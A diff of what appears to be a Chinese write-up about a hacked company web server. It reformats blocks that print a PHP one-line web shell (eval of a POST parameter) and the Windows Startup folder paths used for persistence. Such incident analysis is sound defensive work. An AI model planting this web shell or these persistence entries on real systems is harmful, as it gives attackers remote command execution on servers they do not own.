@@ -53,10 +53,13 @@ A集团的应用服务器被黑客入侵，该服务器的Web应用系统被上�
 
 <?php @eval($_POST['hbrj']);?>
 
-cmd输入shell:startup
-C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
+cmd输入shell:
+startup
+C:
+UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
 
-C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
+C:
+ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
 
 联系微信客服
 
@@ -71,19 +74,12 @@ C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
 
 ```
 <?php @eval($_POST['hbrj']);?>
-```
-
-
-
-```
-cmd输入shell:startup
-C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
-```
-
-
-
-```
-C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
+cmd输入shell:
+startup
+C:
+UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
+C:
+ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
 ```
 
 
